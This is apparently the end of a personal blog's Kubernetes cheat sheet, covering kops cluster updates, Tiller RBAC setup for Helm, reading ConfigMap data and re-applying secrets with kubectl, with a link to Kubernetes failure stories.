<span style="color:#ae81ff">15</span>:06:37 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops update cluster <span style="color:#e6db74">${</span>CLUSTER<span style="color:#e6db74">}</span>
I0804 <span style="color:#ae81ff">15</span>:07:01.561380   <span style="color:#ae81ff">60937</span> executor.go:91<span style="color:#f92672">]</span> Tasks: <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">done</span> / <span style="color:#ae81ff">65</span> total; <span style="color:#ae81ff">34</span> can run
<span style="color:#ae81ff">15</span>:07:04 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops update cluster <span style="color:#e6db74">${</span>CLUSTER<span style="color:#e6db74">}</span> --yes
ops has set your kubectl context to k8s.bethebeast.be

Cluster changes have been applied to the cloud.

Changes may require instances to restart: kops rolling-update cluster

<span style="color:#ae81ff">15</span>:07:49 ~/bethebeast.be <span style="color:#f92672">[</span>~d47zm3@w0rk~<span style="color:#f92672">]</span> » kops rolling-update cluster
Using cluster from kubectl context: k8s.bethebeast.be</code></pre></div>
<h3 id="kubernetes-with-rbac-and-tiller">Kubernetes with RBAC and Tiller</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kubectl create serviceaccount tiller --namespace<span style="color:#f92672">=</span>kube-system
kubectl create clusterrolebinding tiller --clusterrole<span style="color:#f92672">=</span>cluster-admin --serviceaccount<span style="color:#f92672">=</span>kube-system:tiller
helm init <span style="color:#75715e"># if you did it before, that&#39;s ok, no need to worry, tiller will be redeployed</span>
kubectl --namespace<span style="color:#f92672">=</span>kube-system edit deployment tiller-deploy
<span style="color:#75715e">### add serviceAccount: tiller to the spec-section, e.g.:</span>
...
spec:
  template:
    spec:
      <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
      restartPolicy: Always
      serviceAccount: tiller
      schedulerName: default-scheduler
      <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span></code></pre></div>
<h3 id="extract-config-file-from-configmap">Extract Config File from ConfigMap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">kubectl get cm app-configmap -o jsonpath=&#39;{.data.config\.yml}&#39;</pre></div>
<h3 id="re-apply-secret-from-file">Re-Apply Secret From File</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">kubectl create secret generic citygate-config --from-file=./config.js --dry-run -o yaml | kubectl apply -f -</pre></div>
<h3 id="kubernetes-failure-horror-stories">Kubernetes Failure Horror Stories</h3>

<ul>
<li><a href="https://github.com/hjacobs/kubernetes-failure-stories">https://github.com/hjacobs/kubernetes-failure-stories</a></li>
</ul>

  </article>
</section>


      </div>

      <footer class="footer">
  <section class="container">
    
     © 2019
    
       · 
      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
    
    
  </section>
</footer>

    </main>

    

  </body>

</html>
